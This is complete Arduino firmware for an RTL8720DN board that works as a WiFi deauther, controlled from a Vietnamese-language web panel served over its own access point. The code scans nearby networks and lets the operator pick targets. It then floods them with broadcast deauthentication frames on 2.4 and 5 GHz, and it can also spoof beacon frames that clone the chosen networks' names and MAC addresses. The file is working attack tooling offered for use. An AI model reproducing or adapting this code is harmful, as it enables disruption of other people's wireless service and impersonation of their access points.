#include <Arduino.h>
#include <WiFi.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
#include <vector>
#include <map>
#include <stdlib.h>
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"

#include <FreeRTOS.h>
#include <task.h>

#ifndef LED_R
  #define LED_R 2
#endif
#ifndef LED_G
  #define LED_G 3
#endif
#ifndef LED_B
  #define LED_B 4
#endif

// Bật/tắt in log debug trong quá trình chuyển kênh (1: bật, 0: tắt)
#define DEBUG_CHANNEL_SWITCH 0

// Định nghĩa trạng thái hoạt động của thiết bị
enum DeviceState {
  STATE_IDLE,
  STATE_SCANNING,
  STATE_ATTACK,
  STATE_BEACON
};

volatile DeviceState currentState = STATE_IDLE;
bool ledEnabled = true; // Nếu false thì tắt LED nhằm tiết kiệm pin

const unsigned long BLINK_INTERVAL_IDLE     = 1500;
const unsigned long BLINK_INTERVAL_ATTACK   = 1000;
const unsigned long BLINK_INTERVAL_SCANNING = 100;
const unsigned long BLINK_INTERVAL_BEACON   = 1000;

struct WiFiScanResult {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
};

const char *ssid_ap = "☠";
const char *pass_ap = "deauther";
int current_channel = 12;

std::vector<WiFiScanResult> scan_results;
std::vector<int> attack_targets_24;
std::vector<int> attack_targets_5;
std::vector<int> beacon_targets_24;
std::vector<int> beacon_targets_5;

uint8_t deauth_bssid[6];

const uint16_t DEAUTH_REASONS[] = {1, 2, 3, 4, 7, 8};
const int DEAUTH_REASON_COUNT = 6;

#define FRAMES_PER_DEAUTH_24 5
#define FRAMES_PER_DEAUTH_5  15
#define FRAMES_PER_BEACON    250

int currentFramesDeauth24 = FRAMES_PER_DEAUTH_24;
int currentFramesDeauth5  = FRAMES_PER_DEAUTH_5;

const unsigned long ATTACK_INTERVAL_24 = 45;
const unsigned long ATTACK_INTERVAL_5  = 90;
unsigned long lastAttackTime24 = 0;
unsigned long lastAttackTime5  = 0;
static int currentTargetIndex24 = 0;
static int currentTargetIndex5  = 0;
static int currentBeaconIndex24 = 0;
static int currentBeaconIndex5  = 0;

void updateLEDs() {
  if (!ledEnabled) {
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, LOW);
    return;
  }
  
  static unsigned long lastToggleTime = 0;
  static bool ledState = false;
  unsigned long now = millis();
  
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);
  
  if (currentState == STATE_IDLE) {
    if (now - lastToggleTime >= BLINK_INTERVAL_IDLE) {
      ledState = !ledState;
      lastToggleTime = now;
    }
    digitalWrite(LED_R, ledState ? HIGH : LOW);
  } else if (currentState == STATE_SCANNING) {
    if (now - lastToggleTime >= BLINK_INTERVAL_SCANNING) {
      ledState = !ledState;
      lastToggleTime = now;
    }
    digitalWrite(LED_R, ledState ? HIGH : LOW);
  } else if (currentState == STATE_ATTACK) {
    if (now - lastToggleTime >= BLINK_INTERVAL_ATTACK) {
      ledState = !ledState;
      lastToggleTime = now;
    }
    digitalWrite(LED_G, ledState ? HIGH : LOW);
  } else if (currentState == STATE_BEACON) {
    if (now - lastToggleTime >= BLINK_INTERVAL_BEACON) {
      ledState = !ledState;
      lastToggleTime = now;
    }
    digitalWrite(LED_B, ledState ? HIGH : LOW);
  }
}

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(result.bssid, &record->BSSID, 6);
    char bssid_str[18] = {0};
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = String(bssid_str);
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  currentState = STATE_SCANNING;
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...\n");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    vTaskDelay(pdMS_TO_TICKS(5000));
    DEBUG_SER_PRINT("Scan done!\n");
    currentState = STATE_IDLE;
    return 0;
  } else {
    DEBUG_SER_PRINT("Scan failed!\n");
    currentState = STATE_IDLE;
    return 1;
  }
}

String parseRequest(String request) {
  if (request.length() == 0) return "";
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  String path = request.substring(path_start, path_end);
  path.trim();
  return path;
}

std::vector<std::pair<String, String>> parsePost(String &request) {
  std::vector<std::pair<String, String>> post_params;
  int body_start = request.indexOf("\r\n\r\n");
  if (body_start == -1) return post_params;
  body_start += 4;
  String post_data = request.substring(body_start);
  int start = 0;
  int end = post_data.indexOf('&', start);
  while (end != -1) {
    String key_value_pair = post_data.substring(start, end);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
      String key = key_value_pair.substring(0, delimiter_position);
      String value = key_value_pair.substring(delimiter_position + 1);
      post_params.push_back({key, value});
    }
    start = end + 1;
    end = post_data.indexOf('&', start);
  }
  String key_value_pair = post_data.substring(start);
  int delimiter_position = key_value_pair.indexOf('=');
  if (delimiter_position != -1) {
    String key = key_value_pair.substring(0, delimiter_position);
    String value = key_value_pair.substring(delimiter_position + 1);
    post_params.push_back({key, value});
  }
  return post_params;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\r\n";
  response += "Content-Type: " + content_type + "\r\n";
  response += "Connection: close\r\n\r\n";
  return response;
}

void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html") +
  R"(
  <!DOCTYPE html>
  <html lang="vi">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RTL8720DN Deauther</title>
    <style>
      /* CSS style đã được giữ nguyên */
      * { box-sizing: border-box; margin: 0; padding: 0; }
      body { font-family: Arial, Helvetica, sans-serif; background: #f2f4f8; color: #333; line-height: 1.4; padding: 5px; font-size: 14px; }
      .container { max-width: 960px; margin: 10px auto; background: #fff; border-radius: 8px; box-shadow: 0 3px 8px rgba(0,0,0,0.1); overflow: hidden; }
      header { background: #2980b9; color: #fff; padding: 10px; text-align: center; }
      header h1 { font-size: 1.4em; }
      main { padding: 10px; }
      table { width: 100%; border-collapse: collapse; margin-bottom: 10px; }
      thead { background: #3498db; color: #fff; }
      th, td { padding: 6px 4px; text-align: center; border-bottom: 1px solid #ddd; font-size: 0.8em; }
      tbody tr:nth-child(even) { background: #f9fafc; }
      .btn { border: none; border-radius: 4px; padding: 8px; margin-bottom: 8px; font-size: 0.9em; cursor: pointer; transition: background 0.3s ease; }
      .btn-deauth { background: #27ae60; color: #fff; width: 32%; }
      .btn-deauth:hover { background: #219150; }
      .btn-deauth-flood { background: #e67e22; color: #fff; width: 32%; }
      .btn-deauth-flood:hover { background: #d35400; }
      .btn-beacon { background: #2980b9; color: #fff; width: 32%; }
      .btn-beacon:hover { background: #2573a6; }
      .btn-rescan { background: #3498db; color: #fff; width: 100%; }
      .btn-rescan:hover { background: #2980b9; }
      .btn-stop { background: #e74c3c; color: #fff; width: 100%; }
      .btn-stop:hover { background: #cf3e33; }
      .btn-toggle { background: #8e44ad; color: #fff; width: 100%; margin-top: 10px; }
      .btn-toggle:hover { background: #732d91; }
      @media (max-width: 600px) {
        header h1 { font-size: 1.2em; }
        th, td { padding: 4px; font-size: 0.75em; }
        .btn { padding: 6px; font-size: 0.8em; }
        .btn-deauth, .btn-deauth-flood, .btn-beacon { width: 32%; }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <header>
        <h1>Bảng điều khiển</h1>
      </header>
      <main>
        <form method="post" action="/action">
          <table>
            <thead>
              <tr>
                <th>Chọn</th>
                <th>Tên mạng</th>
                <th>Địa chỉ MAC</th>
                <th>Kênh</th>
                <th>Tín hiệu</th>
                <th>Tần số</th>
              </tr>
            </thead>
            <tbody>
  )";
  for (uint32_t i = 0; i < scan_results.size(); i++) {
    String display_ssid = scan_results[i].ssid;
    if (display_ssid.length() == 0) {
      display_ssid = "<span style='color: blue; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);'>WiFi Ẩn</span>";
    }
    response += "<tr>";
    response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
    response += "<td>" + display_ssid + "</td>";
    response += "<td>" + scan_results[i].bssid_str + "</td>";
    response += "<td>" + String(scan_results[i].channel) + "</td>";
    response += "<td>" + String(scan_results[i].rssi) + "</td>";
    response += "<td>" + String((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
    response += "</tr>";
  }
  response += R"(
            </tbody>
          </table>
          <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
            <button type="submit" name="action" value="deauth" class="btn btn-deauth">Chạy Deauth</button>
            <button type="submit" name="action" value="deauth_flood" class="btn btn-deauth-flood">Deauth Flood</button>
            <button type="submit" name="action" value="beacon" class="btn btn-beacon">Phát Beacon</button>
          </div>
        </form>
        <form method="post" action="/rescan">
          <button type="submit" class="btn btn-rescan">Quét lại mạng</button>
        </form>
  )";
  if (currentState == STATE_ATTACK || currentState == STATE_BEACON) {
    response += R"(
        <form method="post" action="/action">
          <button type="submit" name="action" value="stop" class="btn btn-stop">Dừng tấn công</button>
        </form>
    )";
  }
  response += R"(
        <form method="post" action="/toggle_led_power">
          <button type="submit" class="btn btn-toggle">Tắt/Bật LED</button>
        </form>
      </main>
    </div>
  </body>
  </html>
  )";
  client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain") + "Not found!";
  client.write(response.c_str());
}

WiFiServer server(80);

void LEDUpdateTask(void *pvParameters) {
  (void) pvParameters;
  while (1) {
    updateLEDs();
    vTaskDelay(pdMS_TO_TICKS(50));
  }
}

int compareTargets(const void *a, const void *b) {
  int idxA = *(const int*)a;
  int idxB = *(const int*)b;
  return scan_results[idxA].channel - scan_results[idxB].channel;
}

void sortTargetsByChannel(std::vector<int>& targets) {
  qsort(targets.data(), targets.size(), sizeof(int), compareTargets);
}

void WebServerTask(void *pvParameters) {
  (void) pvParameters;
  server.begin();
  while (1) {
    WiFiClient client = server.available();
    if (client && client.connected()) {
      String request;
      while (client.available()) {
        request += (char)client.read();
        vTaskDelay(pdMS_TO_TICKS(1));
      }
      if (request.length() == 0 || request.indexOf("favicon.ico") >= 0) {
        client.stop();
      } else {
        DEBUG_SER_PRINT("Request: " + request + "\n");
        String path = parseRequest(request);
        DEBUG_SER_PRINT("Path: " + path + "\n");
        if (path == "/" || path == "/index.html") {
          handleRoot(client);
        } else if (path == "/rescan") {
          scanNetworks();
          handleRoot(client);
        } else if (path == "/action") {
          std::vector<std::pair<String, String>> post_data = parsePost(request);
          String action = "";
          for (auto param : post_data) {
            if (param.first == "action") {
              action = param.second;
              break;
            }
          }
          if (action == "deauth") {
            currentFramesDeauth24 = FRAMES_PER_DEAUTH_24;
            currentFramesDeauth5  = FRAMES_PER_DEAUTH_5;
            attack_targets_24.clear();
            attack_targets_5.clear();
            for (auto param : post_data) {
              if (param.first == "network") {
                int idx = param.second.toInt();
                if (idx >= 0 && idx < (int)scan_results.size()) {
                  uint8_t ch = scan_results[idx].channel;
                  if (ch >= 36)
                    attack_targets_5.push_back(idx);
                  else
                    attack_targets_24.push_back(idx);
                  DEBUG_SER_PRINT("Deauth target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
                }
              }
            }
            if (!attack_targets_24.empty() || !attack_targets_5.empty()) {
              sortTargetsByChannel(attack_targets_24);
              sortTargetsByChannel(attack_targets_5);
              currentState = STATE_ATTACK;
              currentTargetIndex24 = 0;
              currentTargetIndex5 = 0;
              lastAttackTime24 = millis();
              lastAttackTime5  = millis();
            }
          } else if (action == "deauth_flood") {
            currentFramesDeauth24 = FRAMES_PER_DEAUTH_24 * 3;
            currentFramesDeauth5  = FRAMES_PER_DEAUTH_5 * 5;
            attack_targets_24.clear();
            attack_targets_5.clear();
            for (auto param : post_data) {
              if (param.first == "network") {
                int idx = param.second.toInt();
                if (idx >= 0 && idx < (int)scan_results.size()) {
                  uint8_t ch = scan_results[idx].channel;
                  if (ch >= 36)
                    attack_targets_5.push_back(idx);
                  else
                    attack_targets_24.push_back(idx);
                  DEBUG_SER_PRINT("Deauth Flood target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
                }
              }
            }
            if (!attack_targets_24.empty() || !attack_targets_5.empty()) {
              sortTargetsByChannel(attack_targets_24);
              sortTargetsByChannel(attack_targets_5);
              currentState = STATE_ATTACK;
              currentTargetIndex24 = 0;
              currentTargetIndex5 = 0;
              lastAttackTime24 = millis();
              lastAttackTime5  = millis();
            }
          } else if (action == "beacon") {
            beacon_targets_24.clear();
            beacon_targets_5.clear();
            for (auto param : post_data) {
              if (param.first == "network") {
                int idx = param.second.toInt();
                if (idx >= 0 && idx < (int)scan_results.size()) {
                  uint8_t ch = scan_results[idx].channel;
                  if (ch >= 36)
                    beacon_targets_5.push_back(idx);
                  else
                    beacon_targets_24.push_back(idx);
                  DEBUG_SER_PRINT("Beacon target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
                }
              }
            }
            if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
              sortTargetsByChannel(beacon_targets_24);
              sortTargetsByChannel(beacon_targets_5);
              currentState = STATE_BEACON;
              currentBeaconIndex24 = 0;
              currentBeaconIndex5 = 0;
            }
          } else if (action == "stop") {
            currentState = STATE_IDLE;
            attack_targets_24.clear();
            attack_targets_5.clear();
            beacon_targets_24.clear();
            beacon_targets_5.clear();
          }
          handleRoot(client);
        } else if (path == "/toggle_led_power") {
          ledEnabled = !ledEnabled;
          if (!ledEnabled) {
            digitalWrite(LED_R, LOW);
            digitalWrite(LED_G, LOW);
            digitalWrite(LED_B, LOW);
          }
          handleRoot(client);
        } else {
          handle404(client);
        }
        client.stop();
      }
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

void AttackTask(void *pvParameters) {
  (void) pvParameters;
  static int reasonIndex = 0;
  while (1) {
    if (currentState == STATE_ATTACK) {
      unsigned long now = millis();
      if (!attack_targets_24.empty() && (now - lastAttackTime24 >= ATTACK_INTERVAL_24)) {
        int idx = attack_targets_24[currentTargetIndex24];
        if (idx >= 0 && idx < (int)scan_results.size()) {
          uint8_t currentChannel = scan_results[idx].channel;
          // Chỉ chuyển kênh mà không in log debug nếu tắt DEBUG_CHANNEL_SWITCH
          wext_set_channel(WLAN0_NAME, currentChannel);
          #if DEBUG_CHANNEL_SWITCH
          {
            unsigned long startTime = micros();
            wext_set_channel(WLAN0_NAME, currentChannel);
            unsigned long endTime = micros();
            DEBUG_SER_PRINT("2.4GHz channel switch to " + String(currentChannel) + " took " + String(endTime - startTime) + " us\n");
          }
          #endif
          for (size_t i = currentTargetIndex24; i < attack_targets_24.size() && scan_results[attack_targets_24[i]].channel == currentChannel; i++) {
            int targetIdx = attack_targets_24[i];
            memcpy(deauth_bssid, scan_results[targetIdx].bssid, 6);
            for (int j = 0; j < currentFramesDeauth24; j++) {
              uint16_t reason = DEAUTH_REASONS[reasonIndex];
              wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
              vTaskDelay(pdMS_TO_TICKS(5));
              reasonIndex = (reasonIndex + 1) % DEAUTH_REASON_COUNT;
            }
            DEBUG_SER_PRINT("Attacked 2.4GHz target idx: " + String(targetIdx) + " on channel " + String(currentChannel) + "\n");
            currentTargetIndex24++;
          }
          if (currentTargetIndex24 >= (int)attack_targets_24.size()) currentTargetIndex24 = 0;
          lastAttackTime24 = now;
        }
      }
      if (!attack_targets_5.empty() && (now - lastAttackTime5 >= ATTACK_INTERVAL_5)) {
        int idx = attack_targets_5[currentTargetIndex5];
        if (idx >= 0 && idx < (int)scan_results.size()) {
          uint8_t currentChannel = scan_results[idx].channel;
          wext_set_channel(WLAN0_NAME, currentChannel);
          #if DEBUG_CHANNEL_SWITCH
          {
            unsigned long startTime = micros();
            wext_set_channel(WLAN0_NAME, currentChannel);
            unsigned long endTime = micros();
            DEBUG_SER_PRINT("5GHz channel switch to " + String(currentChannel) + " took " + String(endTime - startTime) + " us\n");
          }
          #endif
          for (size_t i = currentTargetIndex5; i < attack_targets_5.size() && scan_results[attack_targets_5[i]].channel == currentChannel; i++) {
            int targetIdx = attack_targets_5[i];
            memcpy(deauth_bssid, scan_results[targetIdx].bssid, 6);
            for (int j = 0; j < currentFramesDeauth5; j++) {
              uint16_t reason = DEAUTH_REASONS[reasonIndex];
              wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
              vTaskDelay(pdMS_TO_TICKS(2));
              reasonIndex = (reasonIndex + 1) % DEAUTH_REASON_COUNT;
            }
            DEBUG_SER_PRINT("Attacked 5GHz target idx: " + String(targetIdx) + " on channel " + String(currentChannel) + "\n");
            currentTargetIndex5++;
          }
          if (currentTargetIndex5 >= (int)attack_targets_5.size()) currentTargetIndex5 = 0;
          lastAttackTime5 = now;
        }
      }
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

void BeaconTask(void *pvParameters) {
  (void) pvParameters;
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  while (1) {
    if (currentState == STATE_BEACON) {
      if (!beacon_targets_24.empty()) {
        int idx = beacon_targets_24[currentBeaconIndex24];
        if (idx >= 0 && idx < (int)scan_results.size()) {
          uint8_t currentChannel = scan_results[idx].channel;
          wext_set_channel(WLAN0_NAME, currentChannel);
          #if DEBUG_CHANNEL_SWITCH
          {
            unsigned long startTime = micros();
            wext_set_channel(WLAN0_NAME, currentChannel);
            unsigned long endTime = micros();
            DEBUG_SER_PRINT("2.4GHz channel switch to " + String(currentChannel) + " took " + String(endTime - startTime) + " us\n");
          }
          #endif
          for (size_t i = currentBeaconIndex24; i < beacon_targets_24.size() &&
               scan_results[beacon_targets_24[i]].channel == currentChannel; i++) {
            int targetIdx = beacon_targets_24[i];
            for (int j = 0; j < FRAMES_PER_BEACON; j++) {
              wifi_tx_beacon_frame(scan_results[targetIdx].bssid, broadcast, scan_results[targetIdx].ssid.c_str());
              vTaskDelay(pdMS_TO_TICKS(5));
            }
            DEBUG_SER_PRINT("Beacon sent for 2.4GHz target idx: " + String(targetIdx) + "\n");
            currentBeaconIndex24++;
          }
          if (currentBeaconIndex24 >= (int)beacon_targets_24.size())
            currentBeaconIndex24 = 0;
        }
      }
      if (!beacon_targets_5.empty()) {
        int idx = beacon_targets_5[currentBeaconIndex5];
        if (idx >= 0 && idx < (int)scan_results.size()) {
          uint8_t currentChannel = scan_results[idx].channel;
          wext_set_channel(WLAN0_NAME, currentChannel);
          #if DEBUG_CHANNEL_SWITCH
          {
            unsigned long startTime = micros();
            wext_set_channel(WLAN0_NAME, currentChannel);
            unsigned long endTime = micros();
            DEBUG_SER_PRINT("5GHz channel switch to " + String(currentChannel) + " took " + String(endTime - startTime) + " us\n");
          }
          #endif
          for (size_t i = currentBeaconIndex5; i < beacon_targets_5.size() &&
               scan_results[beacon_targets_5[i]].channel == currentChannel; i++) {
            int targetIdx = beacon_targets_5[i];
            for (int j = 0; j < FRAMES_PER_BEACON; j++) {
              wifi_tx_beacon_frame(scan_results[targetIdx].bssid, broadcast, scan_results[targetIdx].ssid.c_str());
              vTaskDelay(pdMS_TO_TICKS(5));
            }
            DEBUG_SER_PRINT("Beacon sent for 5GHz target idx: " + String(targetIdx) + "\n");
            currentBeaconIndex5++;
          }
          if (currentBeaconIndex5 >= (int)beacon_targets_5.size())
            currentBeaconIndex5 = 0;
        }
      }
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  
  DEBUG_SER_INIT();
  
  char channelStr[4];
  snprintf(channelStr, sizeof(channelStr), "%d", current_channel);
  WiFi.apbegin((char*)ssid_ap, (char*)pass_ap, channelStr);
  
  scanNetworks();
  
  currentState = STATE_IDLE;
  digitalWrite(LED_R, HIGH);
  
  xTaskCreate(LEDUpdateTask, "LEDUpdate", 1024, NULL, 1, NULL);
  xTaskCreate(WebServerTask, "WebServer", 4096, NULL, 1, NULL);
  xTaskCreate(AttackTask, "Attack", 2048, NULL, 2, NULL);
  xTaskCreate(BeaconTask, "Beacon", 2048, NULL, 2, NULL);
}

void loop() {
  vTaskDelay(pdMS_TO_TICKS(10));
}
